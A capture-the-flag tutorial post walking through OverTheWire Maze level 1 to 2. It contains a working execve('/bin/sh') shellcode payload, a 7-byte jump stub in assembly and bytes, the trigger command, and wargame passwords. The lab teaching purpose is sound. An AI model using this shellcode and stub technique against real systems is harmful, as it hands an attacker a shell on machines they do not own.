---
date: 2023-09-19 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Maze Level 1 → 2 tutorial!!"
permalink: /posts/overTheWire-Maze-Level-1-to-2/
tags: [overthewire, maze, pwn, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Maze Level 1 → 2!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .maze-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .maze-nav .nav-left,.maze-nav .nav-center,.maze-nav .nav-right{flex:1}
  .maze-nav .nav-left{text-align:left}
  .maze-nav .nav-center{text-align:center}
  .maze-nav .nav-right{text-align:right}
  .maze-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .maze-nav a:hover{transform:translateY(-1px)}
  .maze-nav .disabled{opacity:.55}
  :root[data-theme='light'] .maze-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="maze-nav" aria-label="Maze level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Maze-Level-0-to-1/' | relative_url }}">← Previous: Level 0 → 1</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/maze/maze2.html" target="_blank" rel="noopener">
      Official (Level 2) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Maze-Level-2-to-3/' | relative_url }}">
      Next: Level 2 → 3 →
    </a>
  </div>
</nav>

## Login

Use the password from Level 1:

```bash
ssh maze1@maze.labs.overthewire.org -p 2225
# password: fooghihahr
````

Binary to exploit:

```bash
/maze/maze1
```

---

## Task

`/maze/maze1` has an **8-byte buffer** and copies our argv into it, then **executes the buffer** as code:

```c
char buf[8];
strncpy(buf, argv[1], 8);
/* … later … */
((void(*)(void))buf)();   // execute whatever we put in buf
```

Eight bytes isn’t enough for a full `/bin/sh` shellcode. So we’ll put the **real shellcode in an environment variable**, and make a **7-byte stub** in the argv buffer that **jumps** into that environment variable.

---

## A little bit of Theory

* Environment variables live at **stable, high memory** addresses in this wargame.
* The binary’s stack is **executable**, so a tiny stub can `jmp` to our ENV.
* Plan:

  1. Put a **NOP sled + execve("/bin/sh")** shellcode in `SC`.
  2. Find/assume the address of `SC`.
  3. Pass a **7-byte stub** in argv: `mov eax, <addr>; jmp eax`.

---

## Solution

### 1) Load real shellcode into an env var

```bash
export SC=$(python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
```

* `\x90*100` = NOP sled.
* Payload = classic 32-bit `execve("/bin/sh")` followed by clean exit.

> Note: On OTW, the `SC` address was at `0xffffdf0c` during testing.
> If it differs on your run, use `gdb` on a tiny helper to print `getenv("SC")`.

### 2) Build a 7-byte jump stub

We assemble a tiny program that just jumps to `0xffffdf0c`:

```asm
; pwn.asm
section .text
global _start
_start:
    mov eax, 0xffffdf0c
    jmp eax
```

Assemble & link (32-bit):

```bash
nasm -f elf pwn.asm
ld -m elf_i386 -s -o pwn pwn.o
```

Extract the machine code (or use the bytes below directly):

```
\xb8\x0c\xdf\xff\xff\xff\xe0
```

(That’s `mov eax,0xffffdf0c` → `b8 0c df ff ff` and `jmp eax` → `ff e0`.)

### 3) Trigger the exploit

```bash
/maze/maze1 $(python -c 'print("\xb8\x0c\xdf\xff\xff\xff\xe0")')
```

If the address is right, you get a shell as **maze1**; read the next password:

```bash
cat /etc/maze_pass/maze2
# beinguthok   (at the time of writing)
```

---

## Troubleshooting quick tips

* **No shell / program just exits** → ENV address mismatch. Use `gdb` and:

  ```gdb
  (gdb) p (char*)getenv("SC")
  $1 = 0xffffdf0c
  ```

  Re-encode the stub with the printed address (little-endian).
* **`-m32` not found** → try without it; on OTW hosts 32-bit is available.
* **ENV stripped?** → setuid doesn’t strip arbitrary names; avoid `LD_*` vars.

---

**Congrats 🎉** You just chained a **jump stub** with **ENV shellcode** to pop a shell and grab the **maze2** password. Onward to the next level!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

